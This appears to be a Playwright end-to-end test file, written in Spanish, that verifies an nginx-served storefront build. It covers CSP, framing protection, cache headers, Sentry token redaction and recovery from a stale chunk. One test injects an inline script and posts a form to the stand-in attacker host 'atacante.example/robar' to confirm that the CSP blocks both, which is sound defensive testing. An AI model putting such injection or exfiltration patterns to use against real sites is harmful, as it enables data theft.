// IMP-04. Lo que solo existe en el artefacto publicado y no en Vite: el build con su CSP, servido por nginx con la
// configuración de ops/nginx/ (e2e/launch/frontend.ts). Dos tiendas por el mismo nginx, como en producción.
//
// Real: el build (mismo comando que release.yml), la CSP de la <meta> (frontend/csp.ts), las cabeceras y la
// caché de nginx, el proxy de /api y /uploads conservando el Host, y la recuperación ante un chunk borrado.
// Simulado: Sentry es el doble de e2e/doubles/server.ts (el DSN cambia, la política no), y las páginas de pago de
// los dobles viven en /__gateway/, que solo existe en el nginx del E2E. docs/despliegue-frontend.md.
//
// Solo en la modalidad `dist`: en `vite` no hay ni CSP ni nginx que probar.

import { expect, test, type Page } from '@playwright/test'
import { buildContentSecurityPolicy } from '../../csp.ts'
import {
  DOUBLES_URL,
  E2E_MODE,
  E2E_SENTRY_ENVIRONMENT,
  E2E_SENTRY_RELEASE,
  SENTRY_DOUBLE_DSN,
  VITE_PORT,
  storeUrl,
} from '../support/env.ts'
import { http, storeHost, type HttpResult } from '../support/http.ts'
import { linkIn, waitForMail } from '../support/mail.ts'
import {
  acceptInvitation,
  createBanner,
  createProduct,
  panelSession,
  restorePanelSession,
  sessionToken,
} from '../support/panel.ts'
import { createStoreViaApi } from '../support/platform.ts'
import { openProduct } from '../support/storefront.ts'
import type { SentryEnvelope } from '../doubles/server.ts'

test.skip(E2E_MODE !== 'dist', 'Solo sobre el build servido por nginx (E2E_MODE=dist)')
test.describe.configure({ mode: 'serial' })

const PASSWORD = 'Clave-E2e-Artefacto-2026'
const NGINX = `http://127.0.0.1:${VITE_PORT}`

interface Shop {
  slug: string
  storeName: string
  ownerEmail: string
  product: { name: string; sku: string; price: number; stock: number }
  session: string
}

const shopA: Shop = {
  slug: 'artefacto-a',
  storeName: 'Tienda Artefacto A',
  ownerEmail: 'duena-artefacto-a@e2e.test',
  product: { name: 'Mate del artefacto A', sku: 'ART-A-01', price: 3990, stock: 10 },
  session: '',
}
const shopB: Shop = {
  slug: 'artefacto-b',
  storeName: 'Tienda Artefacto B',
  ownerEmail: 'duena-artefacto-b@e2e.test',
  product: { name: 'Bombilla del artefacto B', sku: 'ART-B-01', price: 2990, stock: 10 },
  session: '',
}

/** Una petición a nginx con el Host de la tienda, como la haría el navegador. */
function viaNginx(
  shop: Shop,
  path: string,
  headers: Record<string, string> = {},
  method = 'GET',
  body?: unknown,
): Promise<HttpResult> {
  return http(method, `${NGINX}${path}`, { headers: { Host: `${storeHost(shop.slug)}:${VITE_PORT}`, ...headers }, body })
}

function header(result: HttpResult, name: string): string {
  const value = result.headers[name.toLowerCase()]
  return Array.isArray(value) ? value.join(', ') : (value ?? '')
}

async function sentryEvents(): Promise<Record<string, unknown>[]> {
  const envelopes = (await http('GET', `${DOUBLES_URL}/__doubles/sentry`)).json as SentryEnvelope[]
  return envelopes.flatMap((envelope) =>
    envelope.items.filter((item) => item.type === 'event').map((item) => item.payload as Record<string, unknown>),
  )
}

function exceptionValues(event: Record<string, unknown>): string[] {
  const exception = event.exception as { values?: { value?: string }[] } | undefined
  return (exception?.values ?? []).map((value) => value.value ?? '')
}

async function eventWithMessage(message: string): Promise<Record<string, unknown>> {
  let found: Record<string, unknown> | undefined
  await expect
    .poll(async () => {
      found = (await sentryEvents()).find((event) => exceptionValues(event).some((value) => value.includes(message)))
      return Boolean(found)
    }, { message: `el doble de Sentry no recibió «${message}»`, timeout: 15_000 })
    .toBe(true)
  return found!
}

/** Lanza un error fuera de React, como uno real sin capturar: lo toman los manejadores globales del SDK. */
async function throwInPage(page: Page, message: string): Promise<void> {
  await page.evaluate((text) => {
    setTimeout(() => {
      throw new Error(text)
    })
  }, message)
}

test('preparar dos tiendas con su producto y una imagen subida', async ({ browser }) => {
  test.setTimeout(150_000)
  for (const shop of [shopA, shopB]) {
    const created = await createStoreViaApi({
      slug: shop.slug,
      storeName: shop.storeName,
      adminName: `Dueña ${shop.slug}`,
      adminEmail: shop.ownerEmail,
    })
    expect(created.status, created.text).toBe(200)
    const page = await browser.newPage()
    try {
      const invitation = await waitForMail(shop.ownerEmail, `Te invitaron a administrar ${shop.storeName}`)
      await acceptInvitation(page, linkIn(invitation, '/admin/aceptar-invitacion?token='), PASSWORD)
      await createProduct(page, shop.slug, shop.product)
      if (shop === shopA) await createBanner(page, shop.slug, 'Banner del artefacto', 0)
      shop.session = await panelSession(page)
    } finally {
      await page.close()
    }
  }
})

test('recarga directa de las rutas de la SPA en las dos tiendas', async ({ page }) => {
  for (const [shop, other] of [
    [shopA, shopB],
    [shopB, shopA],
  ] as const) {
    await page.goto(storeUrl(shop.slug, '/shop'))
    await expect(page.getByText(shop.product.name).first()).toBeVisible()
    await expect(page.getByText(other.product.name)).toHaveCount(0)
    await page.reload()
    await expect(page.getByText(shop.product.name).first()).toBeVisible()

    await openProduct(page, shop.slug, shop.product.name)
    const productUrl = page.url()
    expect(productUrl).toContain('/product/')
    await page.goto(productUrl)
    await expect(page.getByRole('heading', { name: shop.product.name })).toBeVisible()

    // Una ruta lazy (su chunk se pide aparte) entrando directo.
    await page.goto(storeUrl(shop.slug, '/checkout'))
    await expect(page.getByText('Algo salió mal')).toHaveCount(0)

    await page.goto(storeUrl(shop.slug, '/esta-ruta-no-existe'))
    await expect(page.getByText('Página no encontrada').first()).toBeVisible()
  }
})

test('el panel navega y recarga detrás de nginx', async ({ page }) => {
  await restorePanelSession(page, shopA.slug, shopA.session)
  await page.goto(storeUrl(shopA.slug, '/admin/products'))
  await expect(page.getByRole('cell', { name: shopA.product.sku })).toBeVisible()
  await page.getByRole('link', { name: /Órdenes/ }).first().click()
  await expect(page).toHaveURL(/\/admin\/orders$/)
  await page.reload()
  await expect(page.getByRole('button', { name: 'Salir' })).toBeVisible()
  await expect(page.getByText('Algo salió mal')).toHaveCount(0)
})

test('archivos estáticos, API y rutas inexistentes', async () => {
  const favicon = await viaNginx(shopA, '/favicon.svg')
  expect(favicon.status).toBe(200)
  expect(header(favicon, 'content-type')).toContain('image/svg+xml')

  // La API va al backend con el Host de cada tienda.
  const settingsA = await viaNginx(shopA, '/api/v1/store-settings')
  const settingsB = await viaNginx(shopB, '/api/v1/store-settings')
  expect(settingsA.status, settingsA.text).toBe(200)
  expect(settingsA.text).toContain(shopA.storeName)
  expect(settingsB.text).toContain(shopB.storeName)
  expect(settingsB.text).not.toContain(shopA.storeName)

  // Una API que no existe sigue siendo la API: nunca el index.html de la SPA.
  const missingApi = await viaNginx(shopA, '/api/v1/esto-no-existe')
  expect(missingApi.status).toBe(404)
  expect(header(missingApi, 'content-type')).toContain('application/json')

  // Un chunk que no existe es 404, no el index.html (un import que recibe HTML rompe con un error de MIME), y no
  // se cachea.
  const missingChunk = await viaNginx(shopA, '/assets/no-existe-abc123.js')
  expect(missingChunk.status).toBe(404)
  expect(missingChunk.text).not.toContain('id="root"')
  expect(header(missingChunk, 'cache-control')).not.toContain('immutable')

  // Métricas y salud solo por la red privada (IMP-03).
  expect((await viaNginx(shopA, '/actuator/health')).status).toBe(404)
  expect((await viaNginx(shopA, '/actuator/prometheus')).status).toBe(404)
})

test('la CSP servida es la del build, sin orígenes de prueba salvo el DSN', async ({ page }) => {
  await page.goto(storeUrl(shopA.slug, '/'))
  const served = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')
  // La misma función que usa el plugin del build: si alguien agrega un origen al build para el E2E, esto falla.
  expect(served).toBe(buildContentSecurityPolicy({ sentryDsn: SENTRY_DOUBLE_DSN }))
  expect(served).not.toContain('unsafe-eval')
  expect(served).not.toMatch(/script-src[^;]*unsafe-inline/)
})

test('la CSP bloquea scripts en línea y formularios hacia otros orígenes', async ({ page }) => {
  await page.goto(storeUrl(shopA.slug, '/'))
  const violations = await page.evaluate(async () => {
    const seen: string[] = []
    document.addEventListener('securitypolicyviolation', (event) => seen.push(event.effectiveDirective))
    ;(window as unknown as { __inline?: boolean }).__inline = false
    const script = document.createElement('script')
    script.textContent = 'window.__inline = true'
    document.head.appendChild(script)

    const form = document.createElement('form')
    form.method = 'POST'
    form.action = 'https://atacante.example/robar'
    document.body.appendChild(form)
    form.submit()

    await new Promise((resolve) => setTimeout(resolve, 500))
    return { seen, inlineRan: (window as unknown as { __inline?: boolean }).__inline }
  })
  expect(violations.inlineRan).toBe(false)
  expect(violations.seen).toContain('script-src-elem')
  expect(violations.seen).toContain('form-action')
  // La navegación bloqueada no ocurre (toHaveURL esperaría para siempre esa navegación pendiente).
  expect(await page.evaluate(() => window.location.href)).toBe(storeUrl(shopA.slug, '/'))
})

test('el panel no se puede enmarcar desde otro origen', async ({ page }) => {
  const index = await viaNginx(shopA, '/admin/orders')
  expect(header(index, 'content-security-policy')).toContain("frame-ancestors 'none'")
  expect(header(index, 'x-frame-options')).toBe('DENY')

  // Una página ajena y sin CSP propia, servida por los dobles (la de otra tienda ya bloquearía el iframe por su
  // default-src 'self', y entonces no se probaría la cabecera), que enmarca el login del panel de A y, como
  // control, una página sin frame-ancestors que sí tiene que cargar.
  await page.goto(`${DOUBLES_URL}/__doubles/enmarcar?src=${encodeURIComponent(storeUrl(shopA.slug, '/admin/login'))}`)
  const control = page.frame({ name: 'control' })!
  await expect(control.locator('body')).toContainText('UP')
  // Chromium reemplaza el documento bloqueado por su página de error.
  await expect.poll(() => page.frame({ name: 'panel' })?.url()).toMatch(/^chrome-error:/)
  await expect(page.frame({ name: 'panel' })!.getByRole('button', { name: 'Ingresar' })).toHaveCount(0)
})

test('las imágenes subidas cargan por nginx con la CSP del backend', async ({ page }) => {
  await page.goto(storeUrl(shopA.slug, '/'))
  const banner = page.locator('img[src*="/uploads/"]').first()
  await expect(banner).toBeVisible()
  const src = (await banner.getAttribute('src')) ?? ''
  // PUBLIC_API_URL es el mismo origen que la tienda: img-src 'self' la deja pasar sobre http.
  expect(src.startsWith(storeUrl(shopA.slug, '/uploads/'))).toBe(true)
  expect(await banner.evaluate((img: HTMLImageElement) => img.complete && img.naturalWidth > 0)).toBe(true)

  const upload = await viaNginx(shopA, new URL(src).pathname)
  expect(upload.status).toBe(200)
  expect(header(upload, 'content-security-policy')).toContain('sandbox')
})

test('Sentry recibe los errores del navegador con ambiente y versión, sin el token de la URL', async ({ page }) => {
  await page.goto(storeUrl(shopA.slug, '/'))
  await throwInPage(page, 'prueba IMP-04 del artefacto')
  const event = await eventWithMessage('prueba IMP-04 del artefacto')
  expect(event.environment).toBe(E2E_SENTRY_ENVIRONMENT)
  expect(event.release).toBe(E2E_SENTRY_RELEASE)

  await page.goto(storeUrl(shopA.slug, '/admin/reset-password?token=secreto-de-un-solo-uso'))
  await throwInPage(page, 'prueba IMP-04 con token')
  const withToken = await eventWithMessage('prueba IMP-04 con token')
  const serialized = JSON.stringify(withToken)
  expect(serialized).not.toContain('secreto-de-un-solo-uso')
  expect((withToken.request as { url?: string } | undefined)?.url).toContain('token=[Filtered]')
})

test('caché: assets inmutables, HTML revalidado y nada privado compartible', async () => {
  const index = await viaNginx(shopA, '/')
  expect(header(index, 'cache-control')).toBe('no-cache')
  const chunk = /src="(\/assets\/index-[^"]+\.js)"/.exec(index.text)?.[1]
  expect(chunk, 'el index.html no apunta a su chunk de entrada').toBeTruthy()
  const asset = await viaNginx(shopA, chunk!)
  expect(asset.status).toBe(200)
  expect(header(asset, 'cache-control')).toContain('immutable')

  // Respuestas privadas: el backend dice no-store y nginx no lo cambia ni cachea nada.
  const token = sessionToken(shopA.session)
  const privateResponses: [string, HttpResult][] = [
    ['órdenes del panel', await viaNginx(shopA, '/api/admin/orders', { Authorization: `Bearer ${token}` })],
    ['login', await viaNginx(shopA, '/api/admin/auth/login', {}, 'POST', { email: shopA.ownerEmail, password: 'otra' })],
    ['seguimiento de orden', await viaNginx(shopA, '/api/v1/orders/track?order_number=NO-EXISTE')],
    ['ajustes de la tienda', await viaNginx(shopA, '/api/v1/store-settings')],
  ]
  for (const [label, result] of privateResponses) {
    const cacheControl = header(result, 'cache-control')
    expect(cacheControl, label).toContain('no-store')
    expect(cacheControl, label).not.toContain('public')
  }

  // La sesión de A no sirve en el host de B, aunque pase por el mismo nginx.
  const foreign = await viaNginx(shopB, '/api/admin/orders', { Authorization: `Bearer ${token}` })
  expect(foreign.status).toBe(401)
})

test('una pestaña que pide un chunk borrado recarga una vez y luego ofrece «Recargar»', async ({ page }) => {
  // Lo que ve una pestaña abierta antes de un despliegue que borró el chunk de /checkout.
  await page.route('**/assets/Checkout-*.js', (route) => route.fulfill({ status: 404, body: 'no existe' }))
  let loads = 0
  page.on('load', () => {
    loads += 1
  })
  await page.goto(storeUrl(shopA.slug, '/shop'))
  const loadsBefore = loads
  await page.evaluate(() => window.sessionStorage.removeItem('uvostore.staleChunkReloadAt'))

  // Navegación de la SPA (sin recargar) a la ruta lazy.
  await page.evaluate(() => {
    window.history.pushState({}, '', '/checkout')
    window.dispatchEvent(new PopStateEvent('popstate'))
  })
  // Recarga una vez sola; el chunk sigue faltando, así que se queda en la pantalla con el botón.
  await expect(page.getByRole('button', { name: 'Recargar' })).toBeVisible({ timeout: 20_000 })
  expect(loads - loadsBefore).toBe(1)
  await page.waitForTimeout(2_000)
  expect(loads - loadsBefore, 'no debe recargar en bucle').toBe(1)
})
